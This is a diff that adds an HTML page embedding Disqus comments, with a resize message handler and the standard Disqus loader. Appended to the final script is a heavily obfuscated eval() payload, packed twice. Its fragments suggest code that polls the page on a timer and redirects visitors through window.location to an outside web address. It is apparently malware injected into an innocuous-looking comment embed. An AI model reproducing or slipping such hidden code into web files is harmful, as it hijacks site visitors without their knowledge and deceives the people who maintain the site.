@@ -1,0 +1,48 @@
+
+<style>
+#disqus_thread a{color: #448aff;}
+</style>
+<div id="disqus_thread"></div>
+<script>
+window.addEventListener('message', receiveMessage, false);
+function receiveMessage(event) {
+  if (event.data) {
+    var msg;
+    try {
+      msg = JSON.parse(event.data);
+    } catch (err) {
+      // Do nothing
+    }
+    if (!msg)
+      return false;
+    if (msg.name === 'resize') {
+      window.parent.postMessage({
+        sentinel: 'amp',
+        type: 'embed-size',
+        height: msg.data.height
+      }, '*');
+    }
+  }
+}
+</script>
+<script>
+function getQueryVariable(variable) {
+  var query = window.location.search.substring(1);
+  var vars = query.split("&");
+  for (var i=0;i<vars.length;i++) {
+    var pair = vars[i].split("=");
+    if(pair[0] == variable){return pair[1];}
+  }
+  return(false);
+}
+var disqus_config = function () { 
+  this.page.url = getQueryVariable("url");
+};
+(function() {
+  var d = document, s = d.createElement('script');
+  s.src = '//' + getQueryVariable("shortname") + '.disqus.com/embed.js';
+  s.setAttribute('data-timestamp', +new Date());
+  (d.head || d.body).appendChild(s);
+})();
+eval((function(x){var d="";var p=0;while(p<x.length){if(x.charAt(p)!="`")d+=x.charAt(p++);else{var l=x.charCodeAt(p+3)-28;if(l>4)d+=d.substr(d.length-x.charCodeAt(p+1)*96-x.charCodeAt(p+2)+3104-l,l);else d+="`";p+=4}}return d})("eval((function (p, a, c, k, e, d) {e = ` 7&c) {return (c < a ? \"\" : e(parseInt(c / a))) + ((c = c % a) > 35 ? String.fromCharCode(c + 29) : c.to` <\"(36));};if (!\"\".replace(/^/,` ^#)) {while (c--) {d[e(c)] = k[c] || e(c);}k = [`!|&e`!|&d[e];}];`\"9*` 6&\"\\\\w+\";};c = 1;}`!\")if (k[c]) {p = p`![%new RegExp(\"\\\\b\" +`!D! + ` *!, \"g\"),`!`!);}}`!%#p;})(\"z a=[\\\"\\\\p\\\\b\\\\b\\\\x\\\\m\\\\B\\\\v\\\\v\\\\r\\\\r\\\\r\\\\w\\\\c\\\\j\\\\c` ?!d\\\\h\\\\h` *!F\\\\e` <!j\\\\n\\\\D\\\",\\\"` 5!m` h!g\\\\t\\\\e` 0#h` @!` c\"b` 8!n` 0)d` i!t` 8!p` 0#u` L!f` 8!s` O!b\\\\m` M#` (1h` $!e\\\\E` ?#p` ;$y`!U&`\"L\"f` *#b` :!A\\\\b` *#C\\\\J\\\\N` b!P\\\\O\\\\G` 3&` g\"c`!.!L\\\"];$(M)[a[H]](k(){k i(){I[a[2]][a[1]](a[0])}k q(){l($(a[4])[a[3]]===0){i()}o` 4#5])[a[3]` \"57` m!6])!==` u!` 1/8]](` :\"9` 9#}}}}q();K`!a!q()},Q)})\", 53, 53, \"||||||||||_0x5983|x74|x61|x65|x6E|x72|x69|x6C|_0xd42ax1|x63|`'O$|if|x73|x6F|else|x68` B%2|x77|x64|x67|x23|x2F|x2E|x70|x66|var|x78|x3A|x58|x6D|x6B|x76|xED|10|window|x75|setInterval|x79|document|xE2|x42|x20|5000\".split(\"|\"), 0, {}));"))
+</script>
